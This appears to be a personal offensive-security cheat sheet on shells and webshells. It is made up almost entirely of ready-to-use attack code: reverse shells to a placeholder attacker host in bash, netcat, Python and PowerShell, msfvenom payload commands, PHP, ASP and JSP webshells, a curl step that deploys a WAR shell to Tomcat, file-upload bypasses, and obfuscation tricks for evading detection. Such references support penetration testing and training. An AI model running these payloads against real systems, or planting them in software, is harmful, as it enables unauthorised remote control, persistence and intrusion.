# 🐚 Shells & Webshells

**Tags:** `#shells` `#webshells`

---

## 🧠 Shell Concepts

- **Bind Shell**: Victim listens for connection; attacker connects.
    
- **Reverse Shell**: Victim initiates connection to attacker.
    
- **Web Shell**: System commands executed via web interface.
    
- **Staged Payload**: Loads in parts (e.g., `windows/meterpreter/reverse_tcp`).
    
- **Stageless Payload**: Delivered as a single chunk.
    
- **Encoding**: Alters format (e.g., Base64).
    
- **Encryption**: Obscures content (e.g., AES).
    
- **TTY vs PTY**:
    
    - TTY: Basic terminal, lacks features (no tab completion, job control).
        
    - PTY: Simulated full terminal.
        

### 🛠 Shell Stabilization (Post-Reverse Shell)

```bash
# Background shell
Ctrl-Z

# On attacker machine
stty raw -echo; fg
reset
export TERM=xterm
```

```bash
# Upgrade to PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

🔗 [Reverse Shell Generator](https://www.revshells.com/)

---

## 🖥️ Terminal Emulators

|Emulator|OS|
|---|---|
|Windows Terminal|Windows|
|cmder|Windows|
|PuTTY|Windows|
|kitty|Windows, Linux, macOS|
|Alacritty|Windows, Linux, macOS|
|xterm|Linux|
|GNOME Terminal|Linux|
|MATE Terminal|Linux|
|Konsole|Linux|
|Terminal (macOS)|macOS|
|iTerm2|macOS|

---

## 🧰 Netcat `#Netcat`

```bash
# Listener
nc -lvnp 4444

# Reverse shell (basic)
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1

# mkfifo shell
mkfifo /tmp/s; nc <attacker-ip> 4444 0</tmp/s | /bin/sh >/tmp/s 2>&1; rm /tmp/s
```

---

## 🪟 PowerShell `#PowerShell`

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('<attacker-ip>',4444);
```

---

## 🧨 Metasploit `#Metasploit`

```bash
msfconsole
search {keyword}
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <ip>
set LPORT <port>
exploit
```

- **Meterpreter**: Advanced post-exploitation shell with extensions.
    

---

## 🧬 MSFVenom `#MSFVenom`

```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf

# Windows EXE
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe

# PHP
msfvenom -p php/reverse_php LHOST=<ip> LPORT=<port> -f raw > shell.php

# WAR (for JSP/Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war > shell.war
```

---

## 🔣 Language-Specific Shells

### 🐧 Bash / POSIX `#Bash`

```bash
/bin/sh -i
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
```

### 🐪 Perl `#Perl`

```perl
perl -e 'exec "/bin/sh";'
```

### 💎 Ruby `#Ruby`

```ruby
ruby -e 'exec "/bin/sh"'
```

### 🌙 Lua `#Lua`

```lua
lua -e "os.execute('/bin/sh')"
```

### 🐤 Awk `#Awk`

```bash
awk 'BEGIN {system("/bin/sh")}'
```

### 📝 Find `#Find`

```bash
find . -exec /bin/sh \; -quit
```

### 📝 VIM `#VIM`

```vim
vim -c ':!/bin/sh'
:set shell=/bin/sh
:shell
```

### 🐍 Python `#Python`

```python
import os
os.system("/bin/sh")
```

```python
import socket, subprocess, os
s=socket.socket(); s.connect(("ATTACKER-IP",PORT))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh"])
```

### ☕ Java `#Java`

```java
Runtime.getRuntime().exec("/bin/sh");
```

---

## 🕸️ Webshells

### 🐘 PHP `#PHP`

```php
<?php echo shell_exec($_GET['INSERT COMMAND HERE']); ?>
<?php echo exec($_GET['INSERT COMMAND HERE']); ?>
```

- [phpbash](https://github.com/Arrexel/phpbash) — Interactive shell
    
- Obfuscated:
    
    ```php
    <?php eval(gzinflate(base64_decode('...'))); ?>
    ```
    
- Password Protected:
    
    ```php
    <?php if ($_GET['p'] === 'secret') { system($_GET['INSERT COMMAND HERE']); } ?>
    ```
    

### 🧩 ASP `#ASP`

```asp
<% eval request("INSERT COMMAND HERE") %>
```

### ☕ JSP / WAR `#JSP`

```jsp
<%
String cmd = request.getParameter("INSERT COMMAND HERE");
Process p = Runtime.getRuntime().exec(INSERT COMMAND HERE);
// stream output back
%>
```

**WAR Deployment (Tomcat):**

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war > shell.war
curl -u admin:password --upload-file shell.war http://<target>:8080/manager/text/deploy?path=/shell
```

---

## 📦 Shell Delivery Techniques

- **RCE or LFI → Upload** webshell (`php`, `jsp`, `asp`, etc.)
    
- **XSS → CSRF**: Auto-upload a shell via admin interface
    
- **XXE → File Write**: Inject webshell via vulnerable XML parser
    
- **FTP/TFTP/Tomcat Manager**: Upload WAR/EXE files
    
- **File Upload Bypass**:
    
    - Double extensions: `shell.php.jpg`
        
    - Null byte tricks: `shell.php%00.jpg`
        
    - Mime type bypass: change `Content-Type`
        
- **Polyglot files**: Image + shell hybrid
    

---

## 🛰️ Exotic Shell Types

### 🛰️ ICMP Shell

Used to bypass firewalls that only allow ICMP (rare but stealthy).

Tool: `icmpsh` — [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

### 📡 DNS Shell

Exfiltrates or executes commands via DNS.

Tool: `dnscat2` — [https://github.com/iagox86/dnscat2](https://github.com/iagox86/dnscat2)

---

## 🫥 Evasion Techniques

- **Base64 Encoding**
    
    ```bash
    echo 'bash -i >& /dev/tcp/ip/port 0>&1' | base64
    bash -c "$(echo BASE64_STRING | base64 -d)"
    ```
    
- **Shell Substitution**
    
    ```bash
    bash -c "${IFS}bash${IFS}-i${IFS}>&${IFS}/dev/tcp/ip/port${IFS}0>&1"
    ```
    
- **Unicode / Obfuscation**
    
    ```php
    <?php $x='sys'.'tem'; $x($_GET['INSERT COMMAND HERE']); ?>
    ```
    
- **Hex / URL Encoding**
    
    - E.g., `%2fbin%2fsh`
        
- **Mixed case, variable functions, indirect execution**
    
    ```php
    ${${eval}("INSERT COMMAND HERE")}  # Indirect command chaining
    ```
    

---

### 🔐 Obfuscated Payload Variants:

#### 🧱 Basic Eval with Obfuscated Function Name

```javascript
${${"e"+"val"}("system('id');")}
```

#### 🧬 Split and Concatenate Strings

```javascript
${${"e"+"v"+"a"+"l"}("`id`")}
```

#### 🌀 Encoded Command (Base64)

```javascript
${${"eval"}("eval(atob('c3lzdGVtKCd3aG9hbWknKTs='))")} 
// Decodes to: system('whoami');
```

#### 💡 Variable Function Pointer

```javascript
$a="ev"."al"; ${$a}("system('id');");
```

#### 👻 Function Wrapping with Anonymous Function

```javascript
(function(f){ return f("system('id');"); })["call"](this, eval)
```

---

## 📚 Tools & Resources

|Tool|Description|
|---|---|
|Metasploit|Exploit + post-exploitation platform|
|MSFVenom|Payload generation|
|PayloadsAllTheThings|[GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings)|
|Nishang|PowerShell offensive scripts|
|Darkarmour|Obfuscated binaries for Windows|
|Laudanum|[Webshell collection](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)|
|Mythic C2|[Mythic GitHub](https://github.com/its-a-feature/Mythic) — modern C2 framework|

---